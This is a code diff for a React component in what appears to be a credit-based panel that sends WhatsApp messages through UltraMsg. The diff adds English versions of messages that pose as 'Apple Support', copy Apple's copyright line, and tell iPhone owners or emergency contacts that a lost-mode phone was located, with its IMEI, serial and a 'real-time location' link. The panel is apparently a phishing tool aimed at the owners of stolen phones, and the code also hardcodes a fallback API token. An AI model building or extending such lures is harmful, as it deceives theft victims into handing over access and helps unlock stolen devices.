@@ -34,7 +34,7 @@ interface ProcessListProps {
 const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
   const [processes, setProcesses] = useState<Process[]>([]);
   const [loading, setLoading] = useState(true);
-  const [sendingMessage, setSendingMessage] = useState<string | null>(null);
+  const [sendingMessage, setSendingMessage] = useState<{ id: string; language: string } | null>(null);
   const [userCredits, setUserCredits] = useState(0);
 
   useEffect(() => {
@@ -171,7 +171,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
     }
   };
 
-  const sendWhatsAppMessage = async (process: Process) => {
+  const sendWhatsAppMessage = async (process: Process, language: 'spanish' | 'english') => {
     try {
       // Verificar créditos antes de enviar
       if (userCredits <= 0) {
@@ -183,22 +183,41 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         return;
       }
 
-      setSendingMessage(process.id);
-      console.log('Sending WhatsApp message for process:', process.id);
+      setSendingMessage({ id: process.id, language });
+      console.log(`Sending WhatsApp message for process: ${process.id} in ${language}`);
 
-      // Obtener configuración de instancia
+      // Obtener configuración según el idioma
+      const settingsKeys = language === 'spanish' 
+        ? ['whatsapp_instance', 'whatsapp_token']
+        : ['whatsapp_instance_en', 'whatsapp_token_en'];
+
       const { data: settings } = await supabase
         .from('system_settings')
         .select('*')
-        .in('setting_key', ['whatsapp_instance', 'whatsapp_token']);
+        .in('setting_key', settingsKeys);
 
       const config = settings?.reduce((acc: any, setting: any) => {
         acc[setting.setting_key] = setting.setting_value;
         return acc;
       }, {});
 
-      const instanceId = config?.whatsapp_instance || 'instance126876';
-      const token = config?.whatsapp_token || '4ecj8581tubua7ry';
+      const instanceId = language === 'spanish' 
+        ? (config?.whatsapp_instance || 'instance126876')
+        : (config?.whatsapp_instance_en || 'instance_en_default');
+        
+      const token = language === 'spanish' 
+        ? (config?.whatsapp_token || '4ecj8581tubua7ry')
+        : (config?.whatsapp_token_en || 'token_en_default');
+
+      // Verificar que existan las configuraciones para el idioma seleccionado
+      if (!instanceId || !token || instanceId.includes('default') || token.includes('default')) {
+        toast({
+          title: "Configuración faltante",
+          description: `No hay configuración de WhatsApp para ${language === 'spanish' ? 'español' : 'inglés'}. Configúrala en Configuraciones.`,
+          variant: "destructive",
+        });
+        return;
+      }
 
       // Obtener la URL de la imagen del iPhone basada en modelo y color
       const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
@@ -208,17 +227,22 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       const imageExists = await checkImageExists(imageUrl);
       console.log('Image exists:', imageExists);
 
-      // Crear el mensaje personalizado según el tipo de contacto y modo perdido
+      // Crear el mensaje personalizado según el idioma
       let message = '';
       
       // Determinar el texto de estado según el modo perdido
-      const statusText = process.lost_mode 
-        ? '✅ iPhone en modo perdido localizado con éxito' 
-        : '✅ iPhone localizado con éxito';
+      const statusText = language === 'spanish' 
+        ? (process.lost_mode 
+          ? '✅ iPhone en modo perdido localizado con éxito' 
+          : '✅ iPhone localizado con éxito')
+        : (process.lost_mode 
+          ? '✅ iPhone in lost mode successfully located' 
+          : '✅ iPhone successfully located');
       
-      if (process.contact_type === 'propietario') {
-        if (process.owner_name) {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+      if (language === 'spanish') {
+        if (process.contact_type === 'propietario') {
+          if (process.owner_name) {
+            message = `*Soporte de Apple 👨🏽‍🔧*
 
 *${statusText}*
 *👤 Propietario: ${process.owner_name}*
@@ -234,8 +258,8 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        } else {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+          } else {
+            message = `*Soporte de Apple 👨🏽‍🔧*
 
 *${statusText}*
 
@@ -250,10 +274,10 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        }
-      } else {
-        if (process.owner_name) {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+          }
+        } else {
+          if (process.owner_name) {
+            message = `*Soporte de Apple 👨🏽‍🔧*
 
 *🚨 Eres un contacto de emergencia ${process.owner_name}*
 
@@ -270,8 +294,8 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        } else {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+          } else {
+            message = `*Soporte de Apple 👨🏽‍🔧*
 
 *🚨 Eres un contacto de emergencia*
 
@@ -288,6 +312,83 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
+          }
+        }
+      } else {
+        // Mensajes en inglés
+        if (process.contact_type === 'propietario') {
+          if (process.owner_name) {
+            message = `*Apple Support 👨🏽‍🔧*
+
+*${statusText}*
+*👤 Owner: ${process.owner_name}*
+
+*📱 Model:* ${process.iphone_model}
+*💾 Storage:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serial:* ${process.serial_number}
+
+*🧾 Type Menu to request assistance.*${process.url ? `
+
+*🔗 Link to view real-time location:* ${process.url}` : ''}
+
+*Copyright © 2025 Apple Inc. All rights reserved.*`;
+          } else {
+            message = `*Apple Support 👨🏽‍🔧*
+
+*${statusText}*
+
+*📱 Model:* ${process.iphone_model}
+*💾 Storage:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serial:* ${process.serial_number}
+
+*🧾 Type Menu to request assistance.*${process.url ? `
+
+*🔗 Link to view real-time location:* ${process.url}` : ''}
+
+*Copyright © 2025 Apple Inc. All rights reserved.*`;
+          }
+        } else {
+          if (process.owner_name) {
+            message = `*Apple Support 👨🏽‍🔧*
+
+*🚨 You are an emergency contact for ${process.owner_name}*
+
+*${statusText}*
+
+*📱 Model:* ${process.iphone_model}
+*💾 Storage:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serial:* ${process.serial_number}
+
+*🧾 Type Menu to request assistance.*${process.url ? `
+
+*🔗 Link to view real-time location:* ${process.url}` : ''}
+
+*Copyright © 2025 Apple Inc. All rights reserved.*`;
+          } else {
+            message = `*Apple Support 👨🏽‍🔧*
+
+*🚨 You are an emergency contact*
+
+*${statusText}*
+
+*📱 Model:* ${process.iphone_model}
+*💾 Storage:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serial:* ${process.serial_number}
+
+*🧾 Type Menu to request assistance.*${process.url ? `
+
+*🔗 Link to view real-time location:* ${process.url}` : ''}
+
+*Copyright © 2025 Apple Inc. All rights reserved.*`;
+          }
         }
       }
 
@@ -296,7 +397,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       // Enviar mensaje con imagen si existe, solo texto si no existe
       if (imageExists) {
         console.log('Sending message with image');
-        // Enviar mensaje con imagen via WhatsApp API usando el endpoint de imagen
         const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
           method: 'POST',
           headers: {
@@ -312,7 +412,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         result = await response.json();
       } else {
         console.log('Image not found, sending text only message');
-        // Enviar solo mensaje de texto si la imagen no existe
         const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
           method: 'POST',
           headers: {
@@ -384,9 +483,10 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         }
 
         const messageType = imageExists ? 'con imagen' : 'solo texto (imagen no disponible)';
+        const languageText = language === 'spanish' ? 'español' : 'inglés';
         toast({
           title: "Mensaje enviado",
-          description: `Mensaje ${messageType} enviado a ${process.client_name}. Créditos restantes: ${userCredits - 1}`,
+          description: `Mensaje ${messageType} enviado en ${languageText} a ${process.client_name}. Créditos restantes: ${userCredits - 1}`,
         });
 
         // Recargar procesos
@@ -480,23 +580,44 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
                       {process.status}
                     </Badge>
                     <div className="flex space-x-1">
+                      {/* Botón enviar en Español */}
                       <Button
                         size="sm"
-                        onClick={() => sendWhatsAppMessage(process)}
-                        disabled={sendingMessage === process.id || userCredits <= 0}
+                        onClick={() => sendWhatsAppMessage(process, 'spanish')}
+                        disabled={sendingMessage?.id === process.id || userCredits <= 0}
+                        className={`${
+                          userCredits <= 0 
+                            ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
+                            : 'bg-blue-600/20 hover:bg-blue-600/30 text-blue-300'
+                        }`}
+                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Enviar en español"}
+                      >
+                        {sendingMessage?.id === process.id && sendingMessage?.language === 'spanish' ? (
+                          <RefreshCw className="h-4 w-4 animate-spin" />
+                        ) : (
+                          <>🇪🇸</>
+                        )}
+                      </Button>
+
+                      {/* Botón enviar en Inglés */}
+                      <Button
+                        size="sm"
+                        onClick={() => sendWhatsAppMessage(process, 'english')}
+                        disabled={sendingMessage?.id === process.id || userCredits <= 0}
                         className={`${
                           userCredits <= 0 
                             ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
                             : 'bg-green-600/20 hover:bg-green-600/30 text-green-300'
                         }`}
-                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Enviar mensaje"}
+                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Send in English"}
                       >
-                        {sendingMessage === process.id ? (
+                        {sendingMessage?.id === process.id && sendingMessage?.language === 'english' ? (
                           <RefreshCw className="h-4 w-4 animate-spin" />
                         ) : (
-                          <Send className="h-4 w-4" />
+                          <>🇺🇸</>
                         )}
                       </Button>
+
                       <Button
                         size="sm"
                         onClick={() => deleteProcess(process.id)}
